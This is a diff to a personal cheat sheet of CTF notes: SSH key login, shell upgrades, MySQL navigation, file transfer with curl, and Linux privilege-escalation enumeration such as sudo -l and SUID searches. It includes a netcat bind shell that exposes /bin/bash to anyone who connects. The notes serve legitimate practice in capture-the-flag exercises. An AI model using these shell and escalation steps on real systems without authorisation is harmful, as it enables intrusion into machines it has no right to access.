@@ -10,6 +10,10 @@ notes gathered from doing numerous CTFs to help with further CTFs
 <p> known hosts ssh file will show all hosts the host has SSH'd into
 <p> - command to reset a broke terminal session
 <p> $> reset
+<p> - ssh using private rsa instead of password:
+<p> ssh -i [private rsa] [user]@[ip]
+<p> - impacket tools location on kali
+<p> /usr/share/doc/python3-impacket/examples/
 <p> -----------------------------------------------------------------------------------------
 </p>
 <p> upgrade shell using python pty library and adds auto complete for steps 2+ :
@@ -19,42 +23,55 @@ notes gathered from doing numerous CTFs to help with further CTFs
 <p> 4 - fg <enter key>
 <p> 5 - export TERM=xterm
 <p> -----------------------------------------------------------------------------------------
-
-
 <p> - mysql syntax for navigation:
 <p> show databases; (shows available databases)
 <p> use [database name]; (selects database to use)
 <p> show tables; (shows tables in database)
 <p> describe [table name]; (shows more information on values inside table)
 <p> select [table value] from [table]; (shows items inside the table values of the table)
-  
+<p> -----------------------------------------------------------------------------------------
+<p> - use rpcclient to :
+<p> rpcclient
+
+<p> -----------------------------------------------------------------------------------------
 <p> - file upload (works with powershell and linux):
 <p> curl http://[ip]:[port]/[file] -output [file]
+<p> - monitor all root processes:
+<p> while true;do ps -ef | grep sh | grep -v sshd | grep root; done;
+<p> show all files we have read access on:
+<p> find . -readable
 
 
 
 
 
 
-*nix:
-common privilege escalation techniques:
-- seeing if any commands can be run as sude:
-sudo -l
-- check which programs are avilable on the system for priviledge escalation and send errors away from output
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
-- download all FTP contents (--no-passive if passive is not allowed):
-wget -m htp:anonymous:anonymous@<remote IP> (--no-passive) 
-- bind shell:
-(victim) nc -lp <port> -e /bin/bash  (attacker) rlwrap nc <ip> <port>
-- listing file/ directory structure:
-find . 
-- listing file structure and look for specific file/ directory name
-find . | grep -i <word to look for>
-- show all running processes:
-ss -lntp
-- 
-
-
+<p> *nix:
+<p> common privilege escalation techniques:
+<p> - seeing if any commands can be run as sude:
+<p> sudo -l
+<p> - check which programs are avilable on the system for priviledge escalation and send errors away from output
+<p> which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+<p> - download all FTP contents (--no-passive if passive is not allowed):
+<p> wget -m htp:anonymous:anonymous@<remote IP> (--no-passive) 
+<p> - bind shell:
+<p> (victim) nc -lp <port> -e /bin/bash  (attacker) rlwrap nc <ip> <port>
+<p> - listing file/ directory structure:
+<p> find . 
+<p> - listing file structure and look for specific file/ directory name
+<p> find . | grep -i <word to look for>
+<p> - show all running processes:
+<p> ss -lntp
+<p> -find all running processes belonging to a specfic user
+<p> ps -ef | grep <user>
+<p> - SUID file enum:
+<p> find / -perm -4000 -ls 2>/dev/null
+<p> - find files belonging to a specific user:
+<p> find / -user <user> -ls 2>/dev/null
+<p> - get files running on localhost:
+<p> curl http://127.0.0.1:[port>]/[file]
+<p> -search for value [words] inside all files recursively:
+<p> grep -r [words] ./
 
 
 
